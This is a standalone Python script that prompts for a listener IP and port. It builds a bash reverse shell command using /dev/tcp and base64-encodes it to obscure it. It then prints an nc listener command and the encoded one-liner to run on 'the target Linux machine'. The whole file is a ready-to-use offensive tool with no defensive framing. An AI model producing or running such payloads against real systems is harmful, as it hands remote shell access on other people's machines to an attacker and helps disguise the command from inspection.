#!/usr/bin/env python3

import base64
import sys

def generate_payload(ip, port):
    """
    Generates a Base64-encoded bash reverse shell payload.
    """
    payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    encoded_payload = base64.b64encode(payload.encode()).decode()
    final_command = f"echo '{encoded_payload}' | base64 -d | bash"

    print("\n" + "="*50)
    print("PAYLOAD GENERATION COMPLETE")
    print("="*50)

    print("\n[1] Start this listener on your machine to catch the shell:")
    print(f"\033[92mnc -lvnp {port}\033[0m")

    print("\n[2] Run this command on the target Linux machine:")
    print(f"\033[93m{final_command}\033[0m\n")

if __name__ == "__main__":
    try:
        lhost = input("Enter your listener IP address (LHOST): ")
        lport = input("Enter your listener port (LPORT): ")

        if not lhost or not lport:
            print("\n[!] IP address and port cannot be empty.", file=sys.stderr)
            sys.exit(1)

        generate_payload(lhost, lport)

    except KeyboardInterrupt:
        print("\n\n[!] Script terminated by user.")
        sys.exit(0)
    except EOFError:
        print("\n\n[!] Input stream closed unexpectedly. Please run in an interactive terminal.", file=sys.stderr)
        sys.exit(1)
